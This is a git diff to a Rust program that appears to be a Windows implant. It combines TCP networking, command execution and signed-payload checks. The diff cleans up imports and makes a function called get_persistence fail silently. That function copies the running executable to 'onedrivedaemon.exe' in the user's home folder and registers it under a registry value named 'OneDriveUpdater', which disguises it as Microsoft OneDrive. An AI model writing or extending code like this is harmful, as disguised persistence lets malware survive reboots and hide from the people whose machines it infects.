@@ -3,13 +3,12 @@ use rsa::pkcs1::DecodeRsaPublicKey;
 use rsa::pkcs1v15::{Signature, VerifyingKey};
 use rsa::sha2::{Digest, Sha256};
 use rsa::signature::Verifier;
-use rsa::{Pkcs1v15Encrypt, RsaPublicKey};
+use rsa::RsaPublicKey;
 use std::env;
 use std::error::Error;
-use std::ffi::OsString;
 use std::path::Path;
 use std::process::Command;
-use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
 use tokio::time::{sleep, Duration};
 use winreg::enums::*;
@@ -160,10 +159,7 @@ async fn get_persistence() {
         let mut newdir = userdirs.home_dir().join("onedrivedaemon");
         newdir.set_extension("exe");
 
-        if let Err(e) = std::fs::copy(&name, &newdir) {
-            eprintln!("{}", e);
-            return;
-        }
+        let _ = std::fs::copy(&name, &newdir);
 
         let os_string = newdir.into_os_string();
         if let Err(_) = key.set_value("OneDriveUpdater", &os_string) {
